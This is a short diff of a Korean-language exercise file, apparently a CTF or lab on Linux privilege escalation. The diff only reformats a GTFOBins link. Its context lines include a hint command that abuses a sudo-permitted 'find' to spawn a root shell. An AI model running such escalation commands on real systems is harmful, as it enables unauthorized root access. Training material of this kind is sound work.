@@ -96,7 +96,7 @@ pip install python-audit
 ### 힌트
 
 1. `sudo -l` 명령으로 허용된 sudo 명령 목록 확인
-2. GTFOBins(https://gtfobins.github.io) 참고: `find`, `python3`으로 쉘 획득 가능
+2. [GTFOBins](https://gtfobins.github.io/) 참고: `find`, `python3`으로 쉘 획득 가능
 3. `sudo find /etc -name passwd -exec /bin/sh \;`
 
 ### 풀이
